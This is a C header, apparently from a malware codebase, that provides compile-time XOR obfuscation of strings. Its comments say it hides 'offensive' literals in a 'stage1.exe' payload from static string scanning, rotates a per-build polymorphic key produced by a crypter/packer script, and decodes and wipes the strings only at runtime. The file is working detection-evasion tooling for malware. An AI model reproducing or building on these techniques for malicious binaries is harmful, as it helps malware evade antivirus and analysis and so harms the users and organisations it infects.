/*
 * Compile-time string obfuscation.
 *
 * Pattern: each offensive literal is spelled out as a per-character XOR
 * expression. GCC folds each `XE('c', i)` at compile time into a single
 * encrypted byte, so the .rodata section contains only encrypted bytes —
 * `strings stage1.exe` never sees the plaintext.
 *
 * At runtime, `xs_decode` unscrambles into a caller-owned stack buffer.
 * `xs_wipe` zeros the buffer before the scope exits.
 *
 * S35 polymorphic key: a 32-byte rotating window declared in xs_seed.h
 * (regenerated per build by crypter/packer/xs_seed_gen.py). Each build
 * sees a different XS_SEED, so every encrypted-byte sequence in .rodata
 * differs across builds while the XE/xs_decode contract stays identical.
 */

#ifndef XOR_STRING_H
#define XOR_STRING_H

#include <stdint.h>
#include <stddef.h>

#include "xs_seed.h"

/*
 * Constant-foldable encoder. Evaluates to one encrypted byte at compile
 * time when XS_SEED is `static const` in the consuming translation unit.
 * Use in `static volatile const unsigned char foo_enc[] = { ... };`
 * initializers.
 */
#define XE(c, i) ((unsigned char)((unsigned char)(c) ^ (unsigned char)(XS_SEED[(i) & 31] + (i))))

/*
 * Decode `n` bytes from `enc` into `out`. `out` must have capacity >= n.
 * Marked noinline so the compiler cannot prove the post-decode contents
 * and rematerialize plaintext into .rodata.
 */
void xs_decode(const volatile unsigned char *enc, char *out, size_t n);

/* Volatile-zero a buffer. Survives optimizer. */
void xs_wipe(char *buf, size_t n);

#endif /* XOR_STRING_H */
